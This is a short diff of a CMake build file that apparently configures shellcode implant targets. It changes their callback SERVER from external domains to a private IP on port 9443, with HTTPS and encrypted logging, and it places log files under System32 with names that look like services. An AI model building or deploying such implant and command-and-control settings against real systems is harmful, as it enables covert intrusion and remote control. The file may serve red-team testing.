@@ -63,8 +63,8 @@ endforeach()
 target_compile_definitions(
     shellcode-pe
     PRIVATE
-    SERVER="ValarMorghulis.org"
-    PORT=443
+    SERVER="192.168.1.127"
+    PORT=9443
     HTTPS=1
     SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\wingupsvc.log"
     ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
@@ -115,8 +115,8 @@ target_include_directories(
 target_compile_definitions(
     test5shellcode-pe
     PRIVATE
-    SERVER="MaesterJam2025.com"
-    PORT=443
+    SERVER="192.168.1.127"
+    PORT=9443
     HTTPS=1
     SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\rcsvc.log"
     ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
